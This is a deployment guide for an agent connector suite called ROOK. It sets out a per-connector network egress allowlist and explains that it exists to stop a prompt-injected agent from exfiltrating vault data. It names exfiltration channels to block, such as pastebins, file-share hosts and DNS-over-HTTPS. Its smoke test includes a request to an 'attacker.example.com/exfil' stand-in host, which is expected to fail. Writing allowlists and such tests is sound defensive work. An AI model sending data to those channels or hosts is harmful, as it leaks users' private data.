# Connector egress allowlist

**For Managed Agents deployment.** This file lists the exact outbound domains each ROOK connector talks to. When deploying ROOK via Anthropic Managed Agents (or any sandboxed/hosted runtime), configure the agent network policy to allow ONLY these domains. Default-deny everything else.

For local Claude Code installs this doc is reference, not a runtime constraint — the customer's machine has whatever network access the customer's machine has.

## Why egress filtering matters

A compromised agent (via prompt injection, malicious tool output, or a stale credential) can attempt to exfiltrate vault contents by `POST`-ing to an attacker-controlled URL. Even with operator-confirm gates on writes to KNOWN connectors, an agent can still make arbitrary outbound HTTP calls if the runtime allows it.

The allowlist is the second line of defense — the agent's runtime simply cannot reach domains not on this list, regardless of what it was instructed to do.

## Per-connector egress

| Connector | Required domains |
|---|---|
| `perplexity` | `api.perplexity.ai` |
| `gmail` | `gmail.googleapis.com`, `oauth2.googleapis.com`, `accounts.google.com` |
| `google-calendar` | `www.googleapis.com`, `oauth2.googleapis.com` |
| `google-search-console` | `searchconsole.googleapis.com`, `oauth2.googleapis.com` |
| `google-analytics` | `analyticsdata.googleapis.com`, `analyticsadmin.googleapis.com`, `oauth2.googleapis.com` |
| `whatsapp-business` | `graph.facebook.com`, `lookaside.fbsbx.com` (media download) |
| `meta-graph` | `graph.facebook.com`, `graph.instagram.com` |
| `hubspot` | `api.hubapi.com` |
| `shopify` | `*.myshopify.com`, `shopify.com` |
| `stripe` | `api.stripe.com`, `files.stripe.com` |
| `quickbooks` | `quickbooks.api.intuit.com`, `sandbox-quickbooks.api.intuit.com`, `oauth.platform.intuit.com` |
| `docusign` | `account.docusign.com`, `account-d.docusign.com`, `*.docusign.net` |
| `adobe-acrobat` | `pdf-services.adobe.io`, `ims-na1.adobelogin.com` |
| `adobe-sign` | `api.na1.echosign.com`, `api.na2.echosign.com`, `api.eu1.echosign.com` |
| `apollo` | `api.apollo.io`, `app.apollo.io` |
| `zoominfo` | `api.zoominfo.com` |
| `autodesk` | `developer.api.autodesk.com`, `developer.api.autodesk.com/authentication` |
| `figma` | `api.figma.com` |
| `linkedin` | `api.linkedin.com`, `www.linkedin.com/oauth` |
| `twitter-x` | `api.x.com`, `api.twitter.com` |
| `discord` | `discord.com/api`, `gateway.discord.gg` |
| `github` | `api.github.com`, `github.com` (for OAuth) |
| `vercel` | `api.vercel.com` |
| `cloudflare` | `api.cloudflare.com` |
| `supabase` | `*.supabase.co`, `api.supabase.com` |
| `drive-sharepoint` | `www.googleapis.com` (Drive), `graph.microsoft.com` (SharePoint) |
| `obsidian` | (local-only — no egress required; wraps obsidian-cli reading filesystem) |

## What's NOT on the allowlist (must remain blocked)

Anything else. Specifically:
- Arbitrary IP addresses
- Any domain not in the table above
- Internal RFC1918 private network ranges (10.x, 172.16-31.x, 192.168.x) — agents have no business talking to the operator's internal network
- DNS over HTTPS endpoints (could be used for covert exfiltration)
- Pastebins, file-share services (transfer.sh, 0x0.st, paste.ee, etc.)
- Any `*.workers.dev` or `*.vercel.app` not explicitly the operator's own deployment

## Verifying the allowlist on first deploy

After Managed Agents config is in place, run a smoke test from each agent that has external connectors:

```python
# Each connector's client.py should pass; arbitrary URL POST should fail
from claude_connectors.perplexity import PerplexityClient
ppx = PerplexityClient.from_env()
print(ppx.search("smoke test", max_results=1))  # should succeed

import urllib.request
urllib.request.urlopen("https://attacker.example.com/exfil")  # should fail at network layer
```

If the second call succeeds, the egress filter is not active — STOP and reconfigure.

## Update cadence

When a new connector is added to `.claude/connectors/`, add its egress domains here in the same commit. Ops-engineer's `contamination-audit` mode checks for new connector folders that haven't been added to this allowlist.

## Source

This pattern is the standard zero-trust egress filtering practice for sandboxed multi-agent runtimes; surfaced specifically in Perplexity ping-pong 2026-05-19 review of ROOK v3.1 ship state. Managed Agents network policy syntax: see Anthropic platform docs for the current `managed-agents-2026-04-01` beta header.
